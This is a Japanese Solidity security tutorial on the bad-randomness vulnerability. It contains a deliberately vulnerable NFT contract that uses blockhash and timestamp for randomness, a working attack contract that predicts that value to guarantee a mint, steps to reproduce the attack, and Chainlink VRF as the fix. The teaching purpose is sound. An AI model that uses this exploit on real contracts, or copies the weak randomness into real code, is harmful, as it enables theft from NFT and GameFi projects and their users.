---
title: S07. 悪質な乱数
tags:
  - solidity
  - security
  - random
---

# WTF Solidity 合約セキュリティ: S07. 悪質な乱数

私は最近Solidityを学び直して詳細を固めており、「WTF Solidity 合約セキュリティ」を書いています。初心者向けの内容で（プログラミング上級者は他のチュートリアルをお探しください）、毎週1-3講座を更新しています。

Twitter：[@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

コミュニティ：[Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[公式サイト wtf.academy](https://wtf.academy)

すべてのコードとチュートリアルはgithubでオープンソース化されています：[github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

---

今回は、スマートコントラクトの悪質な乱数（Bad Randomness）脆弱性と予防方法について紹介します。この脆弱性はNFTとGameFiでよく見られ、Meebits、Loots、Wolf Gameなどが被害を受けました。

## 疑似乱数

イーサリアム上の多くのアプリケーションは乱数を必要とします。例えば、`NFT`のランダムな`tokenId`選択、ブラインドボックス、`gamefi`バトルでのランダムな勝敗決定などです。しかし、イーサリアム上のすべてのデータは公開透明（`public`）かつ決定論的（`deterministic`）であるため、他のプログラミング言語のように開発者に乱数生成メソッド（例：`random()`）を提供していません。多くのプロジェクト側は、チェーン上の疑似乱数生成方法、例えば`blockhash()`と`keccak256()`メソッドを使用せざるを得ません。

悪質な乱数脆弱性：攻撃者はこれらの疑似乱数の結果を事前に計算し、目標を達成できます。例えば、ランダムな選択ではなく、欲しいレアな`NFT`を任意にミントできます。詳細については[WTF Solidity極簡チュートリアル 第39講：疑似乱数](https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random)をお読みください。

![](./img/S07-1.png)

## 悪質な乱数の事例

以下では悪質な乱数脆弱性を持つNFTコントラクト：BadRandomness.solを学習します。

```solidity
contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // コンストラクタ、NFTコレクションの名称、記号を初期化
    constructor() ERC721("", ""){}

    // ミント関数：入力したluckyNumberが乱数と等しい時のみmintできる
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // 悪質な乱数を取得
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}
```

これには主要なミント関数`luckyMint()`があり、ユーザーが呼び出す際に`0-99`の数字を入力し、チェーン上で生成された疑似乱数`randomNumber`と等しければ、ラッキーNFTをミントできます。疑似乱数は`blockhash`と`block.timestamp`を使用して生成されます。この脆弱性は、ユーザーが生成される乱数を完璧に予測してNFTをミントできることです。

以下に攻撃コントラクト`Attack.sol`を作成します。

```solidity
contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // 乱数を事前に計算
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // luckyNumberを利用して攻撃
        nftAddr.luckyMint(luckyNumber);
    }
}
```

攻撃関数`attackMint()`のパラメータは`BadRandomness`コントラクトアドレスです。この中で乱数`luckyNumber`を計算し、それをパラメータとして`luckyMint()`関数に入力して攻撃を完了します。`attackMint()`と`luckyMint()`は同じブロック内で呼び出されるため、`blockhash`と`block.timestamp`は同じで、それらを使用して生成される乱数も同じです。

## `Remix`再現

Remix内蔵のRemix VMは`blockhash`関数をサポートしていないため、コントラクトをイーサリアムテストネットにデプロイして再現する必要があります。

1. `BadRandomness`コントラクトをデプロイします。

2. `Attack`コントラクトをデプロイします。

3. `BadRandomness`コントラクトアドレスをパラメータとして`Attack`コントラクトの`attackMint()`関数に渡して呼び出し、攻撃を完了します。

4. `BadRandomness`コントラクトの`balanceOf`を呼び出して`Attack`コントラクトのNFT残高を確認し、攻撃が成功したことを確認します。

## 予防方法

この類の脆弱性を予防するために、通常はオラクルプロジェクトが提供するオフチェーン乱数を使用します。例えばChainlink VRFです。この類の乱数はオフチェーンで生成され、その後チェーン上にアップロードされるため、乱数が予測不可能であることが保証されます。詳細については[WTF Solidity極簡チュートリアル 第39講：疑似乱数](https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random)をお読みください。

## まとめ

今回は悪質な乱数脆弱性について紹介し、シンプルな予防方法を紹介しました：オラクルプロジェクトが提供するオフチェーン乱数を使用することです。NFTとGameFiプロジェクト側は、ハッカーに利用されることを防ぐため、チェーン上の疑似乱数を抽選に使用することを避けるべきです。